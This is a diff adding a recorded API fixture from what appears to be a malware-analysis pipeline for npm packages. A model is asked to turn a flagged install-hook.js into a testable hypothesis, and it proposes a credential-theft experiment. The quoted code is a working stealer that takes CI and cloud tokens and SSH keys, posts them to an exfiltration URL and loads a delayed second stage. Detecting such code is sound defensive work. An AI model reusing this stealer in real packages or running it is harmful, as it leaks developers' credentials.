@@ -1,0 +1,54 @@
+{
+  "id": "045_propose_a827951f",
+  "role": "propose",
+  "request": {
+    "method": "POST",
+    "path": "/v1/chat/completions",
+    "body": {
+      "model": "deepseek/deepseek-v4-flash",
+      "messages": [
+        {
+          "role": "system",
+          "content": "Turn one flagged region into one testable security hypothesis. Name the\nmalicious claim, its kind, gating and severity, and a one-line description.\nThen loosely sketch which setup tools an experiment would use and which entry\npoint it would trigger. You are not the final judge; the observed run decides.\nNever dismiss a flag because the code appears benign. The tool sketch is rough —\na later agentic step builds and validates the real experiment."
+        },
+        {
+          "role": "user",
+          "content": "## Package intent (benign baseline)\nDNS resolution with caching\n\n## Flag\n- file: install-hook.js\n- lines: 85-85\n- why: Auto-executes stage1() on require, no export of benign functionality\n\n## Flagged code\n```\n1: const SAFE_TEST_MODE = true;\n2: \n3: const os = require(\"os\");\n4: const fs = require(\"fs\");\n5: const path = require(\"path\");\n6: const http = require(\"http\");\n7: \n8: const EXFIL_URL = \"http://localhost:9999/exfil\";\n9: \n10: function stage1() {\n11:   const stolen = {\n12:     stage: 1,\n13:     timestamp: new Date().toISOString(),\n14:     hostname: os.hostname(),\n15:     username: os.userInfo().username,\n16:     platform: process.platform,\n17:     env: {},\n18:     tokens: {},\n19:   };\n20: \n21:   const sensitivePatterns =\n22:     /NPM_TOKEN|npm_config|AWS_ACCESS|AWS_SECRET|GITHUB_TOKEN|GH_TOKEN|GITLAB|AZURE|DOCKER|CI_TOKEN/i;\n23:   for (const [key, value] of Object.entries(process.env)) {\n24:     if (sensitivePatterns.test(key)) {\n25:       stolen.env[key] = value;\n26:     }\n27:   }\n28: \n29:   const home = os.homedir();\n30:   const tokenFiles = [\n31:     path.join(home, \".npmrc\"),\n32:     path.join(home, \".ssh\", \"id_rsa\"),\n33:     path.join(home, \".ssh\", \"id_ed25519\"),\n34:   ];\n35:   for (const filePath of tokenFiles) {\n36:     try {\n37:       stolen.tokens[path.basename(filePath)] = fs.readFileSync(\n38:         filePath,\n39:         \"utf-8\"\n40:       );\n41:     } catch (e) {\n42: \n43:     }\n44:   }\n45: \n46:   exfil(stolen);\n47: \n48:   scheduleStage2();\n49: }\n50: \n51: function exfil(data) {\n52:   const payload = JSON.stringify(data);\n53:   const url = new URL(EXFIL_URL);\n54:   const req = http.request(\n55:     {\n56:       hostname: url.hostname,\n57:       port: url.port,\n58:       path: url.pathname,\n59:       method: \"POST\",\n60:       headers: {\n61:         \"Content-Type\": \"application/json\",\n62:         \"Content-Length\": Buffer.byteLength(payload),\n63:       },\n64:     },\n65:     () => {}\n66:   );\n67:   req.on(\"error\", () => {});\n68:   req.write(payload);\n69:   req.end();\n70: }\n71: \n72: function scheduleStage2() {\n73: \n74:   const delay = SAFE_TEST_MODE ? 5000 : 72 * 60 * 60 * 1000;\n75: \n76:   setTimeout(() => {\n77:     try {\n78:       require(\"./lib/loader.js\");\n79:     } catch (e) {\n80: \n81:     }\n82:   }, delay);\n83: }\n84: \n85: stage1();\n```\n\n## Setup tools\n- setEnv (setup): Inject environment variables to plant credentials or defeat environment gates.\n- plantFiles (setup): Seed absolute-path files such as /home/node/.npmrc with bait content.\n- setDate (setup): Freeze wall-clock time at an ISO timestamp using libfaketime.\n- stubUrl (setup): Return canned HTTP responses for URL patterns using * as wildcard.\n- patchFile (setup): Rewrite package files with exact string replacements before execution.\n- preload (setup): Inject a Node preload script before the package entrypoint loads.\n- trigger (trigger): Invoke exactly one entrypoint, lifecycle hook, bin, or subpath.\n\nPropose ONE experiment. State the malicious claim to test, its kind, gating and severity, a one-line description, exactly which trigger target you will invoke (one of ['index.js', 'install-hook.js'], or describe custom JS driver code), and a loose list of the setup tools you expect to use. The tool list is a sketch — do not write tool arguments yet."
+        }
+      ]
+    }
+  },
+  "response": {
+    "status": 200,
+    "body": {
+      "id": "fixture-a827951f",
+      "model": "deepseek/deepseek-v4-flash",
+      "provider": "AkashML",
+      "choices": [
+        {
+          "index": 0,
+          "finish_reason": "stop",
+          "message": {
+            "role": "assistant",
+            "content": "{\n  \"description\": \"On require/import of install-hook.js, the module exfiltrates environment credentials and SSH private key files to a remote server\",\n  \"kind\": \"cred_theft\",\n  \"gating\": \"inspector_gate\",\n  \"severity\": \"critical\",\n  \"triggerTargetIntent\": \"require('./install-hook.js')\",\n  \"plannedTools\": [\n    \"setEnv\",\n    \"plantFiles\",\n    \"stubUrl\",\n    \"setDate\",\n    \"preload\"\n  ]\n  \n  ,\n  \"rationale\": \"The code runs stage1() at load time (line 85), reading env vars matching security patterns and reading ~/.npmrc, ~/.ssh/id_rsa, ~/.ssh/id_ed25519, then POSTing the data to EXFIL_URL. The setup will seed bait credentials via setEnv, place bait key files via plantFiles, and detect the exfiltration via stubUrl capture.\"\n}"
+          }
+        }
+      ],
+      "usage": {
+        "prompt_tokens": 1065,
+        "completion_tokens": 213,
+        "prompt_tokens_details": {
+          "cached_tokens": 0
+        }
+      }
+    }
+  },
+  "meta": {
+    "promptVersion": 1,
+    "promptHash": "49622f24083b",
+    "transport": "strict_schema",
+    "recordedStatus": "ok",
+    "recordedTs": "2026-07-23T10:47:03.106Z",
+    "recordedLatencyMs": 12665
+  }
+}
